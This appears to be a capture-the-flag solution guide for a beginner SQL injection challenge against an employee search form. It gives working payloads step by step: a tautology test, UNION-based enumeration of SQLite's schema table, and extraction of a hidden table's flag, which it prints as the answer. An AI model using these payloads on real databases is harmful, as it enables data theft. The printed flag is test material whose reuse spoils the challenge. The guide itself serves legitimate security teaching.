# Solution Guide: Injection Basics Challenge

This document provides the solution method for the "Injection Basics" web challenge.

## Challenge Summary
The challenge involves exploiting a SQL injection vulnerability in an employee search function to extract sensitive data from a hidden table.

## Solution Steps

### Step 1: Explore the Application
1. Visit the application at http://[challenge-url]/
2. Try searching for an employee by ID (e.g., enter "1" in the search box)
3. Observe that the application returns employee information based on the ID

### Step 2: Test for SQL Injection Vulnerability
Try entering a simple SQL injection test:
```
1 OR 1=1
```

This should return all employees in the database, confirming that the application is vulnerable to SQL injection.

### Step 3: Identify the Database Structure
To discover other tables in the database, we can use a UNION-based SQL injection:

```
1 UNION SELECT name, null, null, null, null FROM sqlite_master WHERE type='table'
```

This will return the employee with ID 1 plus a list of all table names in the database. You should see:
- employees
- secret_table

### Step 4: Explore the Secret Table
Now that we know about the `secret_table`, let's examine its structure:

```
1 UNION SELECT sql, null, null, null, null FROM sqlite_master WHERE type='table' AND name='secret_table'
```

This will show the CREATE TABLE statement for the secret_table, revealing its columns:
- id
- secret_key
- flag

### Step 5: Extract the Flag
Now we can extract the flag from the secret_table:

```
1 UNION SELECT id, secret_key, flag, null, null FROM secret_table
```

This will return the employee with ID 1 plus the contents of the secret_table, including the flag:

```
flag{sql_1nj3ct10n_101}
```

## Alternative Shorter Solution
If you already know or suspect that there's a table with a flag column, you can try directly:

```
1 UNION SELECT null, null, flag, null, null FROM secret_table
```

Or even more directly:

```
0 UNION SELECT 1, 2, flag, 4, 5 FROM secret_table
```

This uses 0 as the initial ID (which likely doesn't exist) so only the UNION results are shown.

## Advanced SQL Injection Techniques

### Using Comments to Ignore the Rest of the Query
```
1 UNION SELECT 1, 2, flag, 4, 5 FROM secret_table --
```

The `--` comment tells the SQL engine to ignore everything after it.

### Using LIKE to Search for the Flag Pattern
```
1 UNION SELECT 1, 2, flag, 4, 5 FROM secret_table WHERE flag LIKE 'flag{%'
```

This ensures we only get results where the flag matches the expected pattern.

## Security Concepts Demonstrated
This challenge demonstrates:
1. **SQL Injection**: The ability to modify the structure of SQL queries through user inputs
2. **Input Validation**: Lack of proper input validation and parameterized queries
3. **Database Enumeration**: How attackers can discover database structure through injection
4. **Sensitive Data Exposure**: How improperly secured databases can leak sensitive information 